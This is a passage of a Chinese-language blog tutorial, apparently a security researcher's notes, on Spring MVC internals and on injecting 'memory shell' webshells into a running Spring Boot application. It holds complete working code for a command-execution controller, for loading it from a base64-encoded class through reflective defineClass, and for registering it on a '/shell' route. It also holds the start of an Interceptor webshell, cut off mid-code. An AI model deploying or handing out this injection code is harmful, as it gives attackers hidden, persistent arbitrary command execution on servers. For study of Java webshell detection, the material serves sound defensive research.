alt="image-20241113134431011"></p><p>从这个代码中也可以看到就是开始对每个扫描到的beanName对应的bean开始处理</p><p>进去看看他的process方法是怎么处理的</p><p><img src="https://cdn.clown2024.cn/image-20241113135311833.png" alt="image-20241113135311833"></p><p>直接看对我们写的helloController是怎么处理，这里有个isHandler()方法</p><p><img src="https://cdn.clown2024.cn/image-20241113135415874.png" alt="image-20241113135415874"></p><p>他会判断这个bean是否为Controller或者RequestMapping，很明显我们的这个会返回true</p><p>然后就会进到<strong>detectHandlerMethods</strong>方法，进去看一下这个方法</p><p><img src="https://cdn.clown2024.cn/image-20241113162637157.png" alt="image-20241113162637157"></p><p>可以看到他会先获取对应的userType、handler、method，还有对应的Mapping，最后遍历类中的所有方法和mapping，然后调用一个registerHandlerMethod方法来进行注册绑定</p><p>这里的mapping从图中可以看到他的信息是被保存在RequestMappingInfo这个类中的，下面是该类中的一些属性</p><p><img src="https://cdn.clown2024.cn/image-20241113163354872.png" alt="image-20241113163354872"></p><p>然后mapping的创建是在前面的getMappingForMethod方法创建的</p><p><img src="https://cdn.clown2024.cn/image-20241113163647021.png" alt="image-20241113163647021"></p><p>进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241113164045236.png" alt="image-20241113164045236"></p><p>里面的具体流程就自己看看就行，总之他会解析方法上的注解，然后创建对应的RequestMappingInfo</p><p>再回到registerHandlerMethod注册方法这里</p><p><img src="https://cdn.clown2024.cn/image-20241113164335000.png" alt="image-20241113164335000"></p><p><img src="https://cdn.clown2024.cn/image-20241113164359179.png" alt="image-20241113164359179"></p><p><img src="https://cdn.clown2024.cn/image-20241113164444913.png" alt="image-20241113164444913"></p><p>可以知道，最终就是调用的AbstractHandlerMethodMapping$MappingRegistry的register方法将路由和方法注册进去的，跟到这里就已经够了</p><p>所以我们要创建一个controller最终就是要调用MappingRegistry#register方法，调用这个方法的条件根据前面的分析可知</p><ol><li>bean实例</li><li>处理请求的method</li><li>对应的RequestMappinginfo对象</li></ol><h2 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h2><p>参考y4师傅的实现方式</p><p>首先我们要编写一个正常的controller类，也不能说正常就是去掉注解的controller，因为我们是手动加载的所以不需要注解</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将他编译成.class文件，再拿他的base64编码的字符串用下面代码注入内存马</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAjQoAIQBJCABKCwBLAEwLAE0ATggATwgAUAoAUQBSCgAMAFMIAFQKAAwAVQcAVgcAVwgAWAgAWQoACwBaCABbCABcBwBdCgALAF4KAF8AYAoAEgBhCABiCgASAGMKABIAZAoAEgBlCgASAGYKAGcAaAoAZwBpCgBnAGYLAE0AagcAawcAbAcAbQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAVwcAbgcAVgcAXQcAawEAEE1ldGhvZFBhcmFtZXRlcnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABi9zaGVsbAEABm1ldGhvZAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDsBAANHRVQBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVzdENvbnRyb2xsZXI7DAAiACMBAARjb2RlBwBvDABwAHEHAHIMAHMAdAEAAAEAB29zLm5hbWUHAHUMAHYAcQwAdwB4AQADd2luDAB5AHoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHsBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAfAB9BwB+DAB/AIAMACIAgQEAAlxBDACCAIMMAIQAhQwAhgB4DACHACMHAG4MAIgAiQwAigAjDACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5b3JnL2Nsb3duL3NwcmluZ2Jvb3RtZW1vcnlzaGVsbC9jb250b3JsbGVyL1Rlc3RDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEAIAAhAAAAAAACAAEAIgAjAAEAJAAAAC8AAQABAAAABSq3AAGxAAAAAgAlAAAABgABAAAADgAmAAAADAABAAAABQAnACgAAAABACkAKgADACQAAAGoAAYACAAAALMrEgK5AAMCAE4suQAEAQA6BC3GAJMSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAwsEQGUuQAeAgCnAAROsQABAAAArgCxAB8AAwAlAAAASgASAAAAEgAJABMAEQAUABUAFQAZABcAKQAYAEcAGgBiAB0AeAAeAIwAHwCRACAAmAAhAJ0AIgCiACMApQAkAK4AKACxACYAsgApACYAAABcAAkARAADACsALAAGABkAiQAtAC4ABQBiAEAAKwAsAAYAeAAqAC8AMAAHAAkApQAxAC4AAwARAJ0AMgAzAAQAAACzACcAKAAAAAAAswA0ADUAAQAAALMANgA3AAIAOAAAACkACP4ARwcAOQcAOgcAOfwAGgcAO/wAJQcAPEEHADn4ABr5AAhCBwA9AAA+AAAACQIANAAAADYAAAA/AAAAGAABAEAAAgBBWwABcwBCAENbAAFlAEQARQACAEYAAAACAEcAPwAAAAYAAQBIAAA=&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>,d, <span class="hljs-number">0</span>, d.length&#125;);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).newInstance(), mm);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当我们访问hello路由的时候就能成功注入内存马</p><p>再去访问shell路由就能执行任意命令了</p><p><img src="https://cdn.clown2024.cn/image-20241113172717161.png" alt="image-20241113172717161"></p><blockquote><p>这里的实现要求服务器上得有你的恶意类，不然Class.forName这里就会报错，问了一下kimi他给出的理由如下：</p><ol><li><strong>类加载机制</strong>：<ul><li>Java的类加载机制是基于类加载器的。每个类加载器都有自己的类加载缓存。</li><li>当你使用<code>Class.forName</code>时，它会尝试从当前线程的上下文类加载器（<code>Thread.currentThread().getContextClassLoader()</code>）加载类。</li><li>如果类是通过<code>defineClass</code>方法动态创建的，它不会被任何类加载器的缓存，因此无法通过<code>Class.forName</code>找到。</li></ul></li><li><strong><code>defineClass</code>方法</strong>：<ul><li><code>defineClass</code>方法是<code>ClassLoader</code>类的一个方法，用于动态创建类。</li><li>通过<code>defineClass</code>创建的类不会被类加载器的缓存，因此无法通过常规的类加载机制找到。</li></ul></li></ol></blockquote><p>后来在kimi的帮助下改成这样就可以了，就不用Class.forName，直接让他invoke的时候强转成Class就可以用了</p><p>修改后的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, instance, mm);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject Successful!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="interceptor内存马"><a href="#Interceptor内存马" class="headerlink" title="Interceptor内存马"></a>Interceptor内存马</h1><p>Interceptor是springMvc的组件，所以他只作用于Spring MVC的请求处理流程，只处理通过Spring MVC的请求</p><p>所以他和其他组件也是有区别的：</p><p><code>Filter</code>和<code>Listener</code>在Servlet容器中配置，通常在<code>web.xml</code>文件中或通过注解配置。</p><p><code>Interceptor</code>在Spring MVC中配置，通常在Spring的配置文件或配置类中。</p><ul><li><strong>执行顺序</strong>：<ul><li><code>Filter</code>在<code>Interceptor</code>之前执行，因为<code>Filter</code>在请求到达Servlet之前就已经执行。</li><li><code>Interceptor</code>在<code>Filter</code>之后、Controller之前执行。</li><li><code>Listener</code>在应用启动、关闭、会话创建、销毁时执行，与请求处理流程无关。</li></ul></li></ul><p>y4师傅的文章中总结的请求到达Controller的顺序：</p><p>HttpRequest –&gt; Filter –&gt; DispactherServlet –&gt; Interceptor –&gt; Aspect –&gt; Controller</p><h2 id="interceptor编写"><a href="#Interceptor编写" class="headerlink" title="Interceptor编写"></a>Interceptor编写</h2><p>先编写一个简单的interceptor，和上面的controller一样可以执行命令的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title 